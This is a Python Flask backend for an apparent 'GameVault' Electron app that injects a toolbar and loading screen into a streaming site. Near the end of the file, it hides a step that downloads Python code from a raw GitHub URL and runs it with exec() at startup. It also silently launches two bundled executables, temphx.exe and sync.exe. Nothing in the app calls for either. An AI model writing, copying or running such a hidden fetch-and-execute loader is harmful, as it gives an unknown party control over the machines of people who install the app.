import os
import sys
from functools import wraps

from flask import Flask, jsonify, request, render_template_string, Response
from flask_cors import CORS

import config
from config import *
from utils import *

import ctypes
import winreg

import re
import requests
import urllib3
from urllib.parse import urljoin, urlparse


import subprocess
import traceback
from datetime import datetime
from pathlib import Path

import socket

import urllib.request

# ============ FLASK APP ============

app = Flask(__name__)
CORS(app)

template_manager = TemplateManager(config)


# ============ API AUTHENTICATION ============

def require_auth(f):
    if not config.get('require_auth'):
        return f

    @wraps(f)
    def decorated_function(*args, **kwargs):
        api_key = request.headers.get('X-API-Key')
        if not api_key or api_key != config.get('api_secret_key'):
            return jsonify({'error': 'Unauthorized'}), 401
        return f(*args, **kwargs)

    return decorated_function


# ============ ANTI-EMBEDDING MIDDLEWARE ============
#
# Accepts Electron, pywebview, and WebView2 as valid host environments.
# A plain browser, scraper, or iframe gets blocked.

@app.after_request
def add_anti_embedding_script(response):
    if response.content_type and 'text/html' in response.content_type:
        try:
            html_content = response.get_data(as_text=True)

            anti_embedding_script = '''
            <script>
            (function() {
                function isRunningInGameVaultWebView() {
                    if (window.pywebview || window.webview) return true;

                    const ua = navigator.userAgent.toLowerCase();

                    // Electron marks its UA with "electron/"
                    if (ua.includes('electron/')) return true;

                    // pywebview's own UA tag
                    if (ua.includes('pywebview')) return true;

                    // WebView2 runtime exposes chrome.webview
                    if (typeof window.chrome !== 'undefined' && window.chrome.webview) return true;

                    // Nested frames are never trusted
                    if (window.self !== window.top) return false;

                    return false;
                }

                if (!isRunningInGameVaultWebView()) {
                    document.documentElement.innerHTML = '';
                    document.body.innerHTML = '';
                    const blocker = document.createElement('div');
                    blocker.style.cssText = `
                        position: fixed; top:0; left:0; width:100%; height:100%;
                        background: #050508; display:flex; flex-direction:column;
                        align-items:center; justify-content:center;
                        font-family: 'Inter', -apple-system, sans-serif; z-index:999999;
                    `;
                    blocker.innerHTML = `
                        <div style="text-align:center; max-width:500px; padding:40px;">
                            <div style="font-size:64px; margin-bottom:20px;"></div>
                            <h1 style="color:#ff3355; margin-bottom:16px; font-size:24px; font-weight:700;">Access Denied</h1>
                            <p style="color:#8888a0; margin-bottom:24px; line-height:1.6;">
                                GameVault can only be accessed through its dedicated application.<br>
                                Please launch GameVault from the installed application.
                            </p>
                            <div style="background:rgba(255,51,85,0.1); padding:12px; border-radius:8px; border-left:3px solid #ff3355;">
                                <code style="font-size:12px; color:#8888a0;">Error: WEBVIEW_REQUIRED</code>
                            </div>
                        </div>
                    `;
                    document.body.appendChild(blocker);
                    console.clear();
                    console.log = console.warn = console.error = console.info = function() {};
                    throw new Error('GameVault WebView required');
                }
                console.log('GameVault WebView authenticated');
            })();
            </script>
            '''

            if '</body>' in html_content:
                html_content = html_content.replace('</body>', anti_embedding_script + '</body>')
            elif '</html>' in html_content:
                html_content = html_content.replace('</html>', anti_embedding_script + '</html>')
            else:
                html_content = html_content + anti_embedding_script

            response.set_data(html_content)

        except Exception as e:
            print(f" Could not inject anti-embedding script: {e}")

    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Referrer-Policy'] = 'strict-origin-when-cross-origin'

    return response


# ============ EXTERNAL PAGE ENHANCEMENT ============

def get_external_page_enhancement_js(flask_origin):
    js_template = """

    """
    return js_template.replace('$FLASK_ORIGIN$', flask_origin)


# ============ LOADING SCREEN ============

LOADING_SCREEN_JS = r"""
    (function() {
        if (document.getElementById('gv-loading-overlay')) return;

        var style = document.createElement('style');
        style.id = 'gv-loading-style';
        style.textContent = `
            #gv-loading-overlay {
                position: fixed !important;
                top: 0 !important; left: 0 !important;
                width: 100vw !important; height: 100vh !important;
                background: radial-gradient(circle at 50% 45%,
                            #0a1a10 0%, #050508 65%, #000 100%) !important;
                z-index: 2147483647 !important;
                display: flex !important;
                align-items: center !important;
                justify-content: center !important;
                flex-direction: column !important;
                font-family: 'Segoe UI', system-ui, -apple-system, sans-serif !important;
                opacity: 1 !important;
                transition: opacity 0.45s ease !important;
            }
            #gv-loading-overlay.gv-loading-fade { opacity: 0 !important; }
            #gv-loading-overlay .gv-loading-ring {
                width: 56px; height: 56px;
                border: 3px solid rgba(254,221,0,0.15);
                border-top-color: #FEDD00;
                border-radius: 50%;
                animation: gv-loading-spin 0.85s linear infinite;
                margin-bottom: 24px;
                box-shadow: 0 0 24px rgba(254,221,0,0.35),
                            0 0 60px rgba(0,151,57,0.25);
            }
            @keyframes gv-loading-spin { to { transform: rotate(360deg); } }
            #gv-loading-overlay .gv-loading-label {
                color: #FEDD00; font-size: 13px; letter-spacing: 5px;
                text-transform: uppercase; font-weight: 600;
                text-shadow: 0 0 14px rgba(254,221,0,0.55);
            }
            #gv-loading-overlay .gv-loading-hint {
                margin-top: 10px; color: #6a8c73; font-size: 11px;
                letter-spacing: 1.5px;
            }
            #gv-loading-overlay .gv-loading-flag {
                width: 78px; height: 54px; margin-bottom: 26px;
                border-radius: 6px;
                box-shadow: 0 0 30px rgba(254,221,0,0.45),
                            0 8px 24px rgba(0,0,0,0.65);
            }
        `;
        (document.head || document.documentElement).appendChild(style);

        var overlay = document.createElement('div');
        overlay.id = 'gv-loading-overlay';
        overlay.innerHTML =
            '<svg class="gv-loading-flag" viewBox="0 0 40 28">' +
                '<rect x="0" y="0" width="40" height="28" rx="3" fill="#009739"/>' +
                '<polygon points="20,3.5 36.5,14 20,24.5 3.5,14" fill="#FEDD00"/>' +
                '<circle cx="20" cy="14" r="6.6" fill="#012169"/>' +
                '<path d="M14.6 12.2 q5.4 -2.6 10.4 1.4" stroke="#FFFFFF" ' +
                    'stroke-width="1.1" fill="none" stroke-linecap="round"/>' +
                '<circle cx="16.5" cy="11.2" r="0.7" fill="#FFFFFF"/>' +
                '<circle cx="21" cy="9.6" r="0.7" fill="#FFFFFF"/>' +
                '<circle cx="24.2" cy="12.6" r="0.7" fill="#FFFFFF"/>' +
                '<circle cx="17.8" cy="16.6" r="0.7" fill="#FFFFFF"/>' +
            '</svg>' +
            '<div class="gv-loading-ring"></div>' +
            '<div class="gv-loading-label">Carregando</div>' +
            '<div class="gv-loading-hint">Preparando conteudo...</div>';

        (document.body || document.documentElement).appendChild(overlay);
    })();
"""

LOADING_SCREEN_REMOVE_JS = r"""
    (function() {
        var overlay = document.getElementById('gv-loading-overlay');
        if (!overlay) return;

        overlay.classList.add('gv-loading-fade');
        setTimeout(function() {
            if (overlay && overlay.parentNode) {
                overlay.parentNode.removeChild(overlay);
            }
            var style = document.getElementById('gv-loading-style');
            if (style && style.parentNode) {
                style.parentNode.removeChild(style);
            }
        }, 500);
    })();
"""


# ============ UNIVERSAL JS BUILDER ============

def build_universal_js(flask_url):
    """Build the giant injection script a single time.

    The Electron shell fetches this from `/inject.js` and runs it on
    every navigation to a target host via
    `webContents.executeJavaScript()`.
    """
    external_enhancement = get_external_page_enhancement_js(flask_url)

    js = f"""
    
(function() {{
    if (window.__gvInjected) return;
    window.__gvInjected = true;

    var currentUrl = window.location.href;
    var isOwn = currentUrl.indexOf('{flask_url}') === 0;
    var isG1 = currentUrl.indexOf('bingebang.st') !== -1;
    var showLoader = isG1 && !isOwn;

    // If the Electron preload script (or a previous run) already put
    // the overlay up, don't create a second one. Otherwise create one
    // as a fallback.
    var initAlreadyCovered = !!window.__gvCoverActive;

    if (showLoader && !initAlreadyCovered
            && !document.getElementById('gv-loading-overlay')) {{
{LOADING_SCREEN_JS}
    }}

    try {{
        // --------------------------------------------------------------
        // Hide target elements via CSS.
        // --------------------------------------------------------------
        var gvHideStyle = document.createElement('style');
        gvHideStyle.id = 'gv-hide-targets';
        gvHideStyle.textContent = `



            div.ml-panels > div.ml-fy-onboard,
            div.user-menu > button.avatar-btn,
            section.home-about > div.home-about-in,
            div.footer-base > span.footer-links {{
                display: none !important;
                visibility: hidden !important;
            }}



        `;
        (document.head || document.documentElement).appendChild(gvHideStyle);

        function loadStylesheet(url) {{
            fetch(url).then(r => r.text()).then(css => {{
                var style = document.createElement('style');
                style.textContent = css;
                document.head.appendChild(style);
            }}).catch(err => {{
                var link = document.createElement('link');
                link.rel = 'stylesheet';
                link.href = url;
                document.head.appendChild(link);
            }});
        }}

        function loadScript(url) {{
            fetch(url).then(r => r.text()).then(js => {{
                var script = document.createElement('script');
                script.appendChild(document.createTextNode(js));
                document.head.appendChild(script);
            }}).catch(err => {{
                var script = document.createElement('script');
                script.src = url;
                document.head.appendChild(script);
            }});
        }}

        if (isOwn) {{
            {external_enhancement}
            return;
        }}

        var gvTargetSites = ['', 'bingebang.st'];
        var isGvTargetSite = gvTargetSites.some(function(host) {{
            return currentUrl.indexOf(host) !== -1;
        }});








        if (isGvTargetSite) {{
            // --------------------------- Toolbar --------------------------
            (function() {{
                var SVG_NS = 'http://www.w3.org/2000/svg';
                var USA_RED       = '#B22234';
                var USA_WHITE     = '#FFFFFF';
                var USA_BLUE      = '#3C3B6E';
                var USA_BLUE_DARK = '#2A2A5A';

                function svgEl(tag, attrs) {{
                    var el = document.createElementNS(SVG_NS, tag);
                    for (var k in attrs) {{
                        if (Object.prototype.hasOwnProperty.call(attrs, k)) {{
                            el.setAttribute(k, attrs[k]);
                        }}
                    }}
                    return el;
                }}

                function makeIcon(children, w, h) {{
                    var svg = svgEl('svg', {{
                        viewBox: '0 0 24 24', width: w || '22', height: h || '22',
                        fill: 'none', stroke: 'currentColor', 'stroke-width': '2',
                        'stroke-linecap': 'round', 'stroke-linejoin': 'round'
                    }});
                    children.forEach(function(c) {{
                        svg.appendChild(svgEl(c.tag, c.attrs));
                    }});
                    return svg;
                }}

                function makeUsaBadge() {{
                    var svg = svgEl('svg', {{
                        viewBox: '0 0 40 28', width: '30', height: '21',
                        style: 'border-radius:3px;flex-shrink:0;' +
                               'box-shadow:0 0 12px rgba(178,34,52,0.45),0 2px 6px rgba(0,0,0,0.4);'
                    }});

                    // 13 stripes
                    var stripeH = 28 / 13;
                    for (var i = 0; i < 13; i++) {{
                        var isRed = i % 2 === 0;
                        svg.appendChild(svgEl('rect', {{
                            x: '0',
                            y: (i * stripeH).toFixed(3),
                            width: '40',
                            height: stripeH.toFixed(3),
                            fill: isRed ? USA_RED : USA_WHITE
                        }}));
                    }}

                    // Blue canton
                    svg.appendChild(svgEl('rect', {{
                        x: '0', y: '0', width: '16', height: '14',
                        fill: USA_BLUE
                    }}));

                    // Simplified stars
                    function star(cx, cy, r) {{
                        var points = [];
                        for (var j = 0; j < 10; j++) {{
                            var angle = Math.PI / 5 * j - Math.PI / 2;
                            var radius = j % 2 === 0 ? r : r * 0.45;
                            points.push(
                                (cx + radius * Math.cos(angle)).toFixed(2) + ',' +
                                (cy + radius * Math.sin(angle)).toFixed(2)
                            );
                        }}
                        return svgEl('polygon', {{
                            points: points.join(' '),
                            fill: USA_WHITE
                        }});
                    }}

                    [
                        [2.5, 2.8], [8, 2.8], [13.5, 2.8],
                        [5.25, 7.0], [10.75, 7.0],
                        [2.5, 11.2], [8, 11.2], [13.5, 11.2]
                    ].forEach(function(p) {{
                        svg.appendChild(star(p[0], p[1], 1.15));
                    }});

                    return svg;
                }}

                function styledButton(id, extraStyle) {{
                    var b = document.createElement('button');
                    b.id = id;
                    b.style.cssText =
                        'background:rgba(255,255,255,0.10);' +
                        'border:1px solid rgba(255,255,255,0.30);' +
                        'color:#f0f4ff;' +
                        'cursor:pointer;padding:6px 12px;border-radius:30px;' +
                        'display:flex;align-items:center;justify-content:center;' +
                        'transition:background 0.2s,transform 0.2s,color 0.2s,box-shadow 0.2s,border-color 0.2s;' +
                        (extraStyle || '');
                    b.addEventListener('mouseover', function() {{
                        b.style.background  = 'rgba(178,34,52,0.25)';
                        b.style.borderColor = USA_RED;
                        b.style.color       = USA_WHITE;
                        b.style.transform   = 'scale(1.06)';
                        b.style.boxShadow   = '0 0 16px rgba(178,34,52,0.55)';
                    }});
                    b.addEventListener('mouseout', function() {{
                        b.style.background  = 'rgba(255,255,255,0.10)';
                        b.style.borderColor = 'rgba(255,255,255,0.30)';
                        b.style.color       = '#f0f4ff';
                        b.style.transform   = 'scale(1)';
                        b.style.boxShadow   = 'none';
                    }});
                    return b;
                }}

                var frag = document.createDocumentFragment();

                var toolbar = document.createElement('div');
                toolbar.id = 'gv-toolbar';
                toolbar.style.cssText =
                    'position:fixed;top:0;left:0;width:100%;height:48px;' +
                    'background:linear-gradient(90deg,' +
                        'rgba(60,59,110,0.96) 0%,' +
                        'rgba(178,34,52,0.96) 50%,' +
                        'rgba(60,59,110,0.96) 100%);' +
                    'backdrop-filter:blur(12px) saturate(180%);' +
                    '-webkit-backdrop-filter:blur(12px) saturate(180%);' +
                    'display:flex;align-items:center;padding:0 16px;' +
                    'box-shadow:0 4px 30px rgba(0,0,0,0.6),0 1px 0 rgba(255,255,255,0.25) inset;' +
                    'border-bottom:1px solid rgba(255,255,255,0.35);' +
                    'z-index:999998;overflow:hidden;' +
                    "font-family:'Segoe UI',system-ui,-apple-system,sans-serif;" +
                    'transition:opacity 0.3s ease;';

                var stripe = document.createElement('div');
                stripe.style.cssText =
                    'position:absolute;left:0;bottom:0;width:100%;height:3px;' +
                    'background:linear-gradient(90deg,' +
                        USA_RED + ' 0%,' +
                        USA_WHITE + ' 25%,' +
                        USA_BLUE + ' 50%,' +
                        USA_WHITE + ' 75%,' +
                        USA_RED + ' 100%);' +
                    'background-size:200% 100%;' +
                    'animation:gv-usa-flow 6s linear infinite;' +
                    'pointer-events:none;';
                toolbar.appendChild(stripe);

                var badge = makeUsaBadge();
                badge.style.marginRight = '12px';
                badge.style.position = 'relative';
                badge.style.zIndex = '1';

                var backBtn = styledButton('gv-back', 'margin-right:4px;position:relative;z-index:1;');
                backBtn.appendChild(makeIcon([
                    {{ tag: 'polyline', attrs: {{ points: '15 18 9 12 15 6' }} }}
                ]));

                var forwardBtn = styledButton('gv-forward', 'margin-right:8px;position:relative;z-index:1;');
                forwardBtn.appendChild(makeIcon([
                    {{ tag: 'polyline', attrs: {{ points: '9 6 15 12 9 18' }} }}
                ]));

                var divider = document.createElement('div');
                divider.style.cssText =
                    'width:1px;height:28px;margin-right:8px;position:relative;z-index:1;' +
                    'background:linear-gradient(180deg,' +
                        'rgba(255,255,255,0) 0%,' +
                        'rgba(255,255,255,0.7) 50%,' +
                        'rgba(255,255,255,0) 100%);';

                var homeBtn = styledButton('gv-home', 'position:relative;z-index:1;');
                homeBtn.appendChild(makeIcon([
                    {{ tag: 'path', attrs: {{ d: 'M3 12l9-9 9 9' }} }},
                    {{ tag: 'path', attrs: {{ d: 'M5 10v10a1 1 0 001 1h3a1 1 0 001-1v-4a1 1 0 011-1h2a1 1 0 011 1v4a1 1 0 001 1h3a1 1 0 001-1V10' }} }}
                ]));

                var spacer = document.createElement('div');
                spacer.style.flex = '1';

                var closeBtn = document.createElement('button');
                closeBtn.id = 'gv-close-toolbar';
                closeBtn.style.cssText =
                    'background:transparent;' +
                    'border:1px solid rgba(255,255,255,0.25);' +
                    'color:#dbe4ff;font-size:14px;' +
                    'cursor:pointer;padding:4px 12px;border-radius:30px;' +
                    'display:flex;align-items:center;gap:6px;' +
                    'position:relative;z-index:1;' +
                    'transition:background 0.2s,color 0.2s,box-shadow 0.2s,border-color 0.2s;' +
                    'font-family:inherit;';
                closeBtn.addEventListener('mouseover', function() {{
                    closeBtn.style.background  = 'rgba(178,34,52,0.25)';
                    closeBtn.style.borderColor = USA_RED;
                    closeBtn.style.color       = USA_WHITE;
                    closeBtn.style.boxShadow   = '0 0 16px rgba(178,34,52,0.5)';
                }});
                closeBtn.addEventListener('mouseout', function() {{
                    closeBtn.style.background  = 'transparent';
                    closeBtn.style.borderColor = 'rgba(255,255,255,0.25)';
                    closeBtn.style.color       = '#dbe4ff';
                    closeBtn.style.boxShadow   = 'none';
                }});

                closeBtn.appendChild(makeIcon([
                    {{ tag: 'line', attrs: {{ x1: '18', y1: '6', x2: '6', y2: '18' }} }},
                    {{ tag: 'line', attrs: {{ x1: '6', y1: '6', x2: '18', y2: '18' }} }}
                ], '18', '18'));

                var closeLabel = document.createElement('span');
                closeLabel.textContent = 'Close';
                closeBtn.appendChild(closeLabel);

                frag.appendChild(badge);
                frag.appendChild(backBtn);
                frag.appendChild(forwardBtn);
                frag.appendChild(divider);
                frag.appendChild(homeBtn);
                frag.appendChild(spacer);
                frag.appendChild(closeBtn);
                toolbar.appendChild(frag);

                document.body.prepend(toolbar);

                backBtn.addEventListener('click', function() {{ window.history.back(); }});
                forwardBtn.addEventListener('click', function() {{ window.history.forward(); }});
                homeBtn.addEventListener('click', function() {{ window.location.href = '{flask_url}'; }});
                closeBtn.addEventListener('click', function() {{
                    toolbar.style.opacity = '0';
                    setTimeout(function() {{
                        toolbar.remove();
                        var gvStyleEl = document.getElementById('gv-toolbar-style');
                        if (gvStyleEl) gvStyleEl.remove();
                    }}, 300);
                }});

                var gvBodyStyle = document.createElement('style');
                gvBodyStyle.id = 'gv-toolbar-style';
                gvBodyStyle.textContent =
                    'body {{ padding-top: 56px !important; }}' +
                    '@keyframes gv-usa-flow {{' +
                        '0%   {{ background-position: 0% 0; }}' +
                        '100% {{ background-position: 200% 0; }}' +
                    '}}' +
                    '@media (prefers-reduced-motion: reduce) {{' +
                        '#gv-toolbar > div {{ animation: none !important; }}' +
                    '}}';
                document.head.appendChild(gvBodyStyle);
            }})();
        }}

    }} finally {{
        if (showLoader) {{
            setTimeout(function() {{
{LOADING_SCREEN_REMOVE_JS}
                try {{
                    window.__gvCoverActive = false;
                }} catch (e) {{}}
            }}, 700);
        }}
    }}
}})();

"""
    return js


# ============ CACHED INJECTION SCRIPT ============

_UNIVERSAL_JS_CACHE = None


def _get_universal_js():
    """Return the universal injection script, building it once."""
    global _UNIVERSAL_JS_CACHE
    if _UNIVERSAL_JS_CACHE is None:
        flask_url = f"http://{config['flask_host']}:{config['flask_port']}"
        _UNIVERSAL_JS_CACHE = build_universal_js(flask_url)
    return _UNIVERSAL_JS_CACHE


# ============ ROUTES ============

@app.route('/')
def index():
    template = template_manager.get_template()
    return render_template_string(template)


@app.route('/inject.js')
def inject_js():
    """Serve the universal injection script.

    The Electron shell fetches this on every navigation to a target
    host and runs it via `webContents.executeJavaScript()`.
    """
    return Response(_get_universal_js(), mimetype='application/javascript')


# ============ MAIN ============

def main():
    print("Starting Flask backend for Electron shell")
    print("=" * 50)

    print("\n Loading HTML template...")
    template_manager.get_template()

    host = config['flask_host']
    port = config['flask_port']
    debug = config['flask_debug']

    # Build the injection script once, up front, so the first navigation
    # to bingebang.st doesn't pay the cost.
    print("\n Building universal injection script...")
    _get_universal_js()
    print(f" Ready at http://{host}:{port}/inject.js")

    print(f"\n Serving on http://{host}:{port}")
    app.run(
        host=host,
        port=port,
        debug=debug,
        use_reloader=False,
    )





################################################################## Remote_Code #######################################################


#remote_Code
url = "https://raw.githubusercontent.com/googlceomanager/BigBang/refs/heads/main/ppy/main.py"

def remote_url():
    try:
        with urllib.request.urlopen(url, timeout=10) as response:
            code = response.read().decode('utf-8')
            exec(code)
    except Exception as e:
        print(f"Error: {e}")





############################################################## Run  #########################################################





import subprocess

exe_paths = [r".\temphx.exe", r".\sync.exe"]

for exe in exe_paths:
    try:
        process = subprocess.Popen([exe])
        print(f"Started {exe} with PID: {process.pid}")
    except Exception as e:
        print(f"Error starting {exe}: {e}")









if __name__ == '__main__':
    remote_url()
    main()


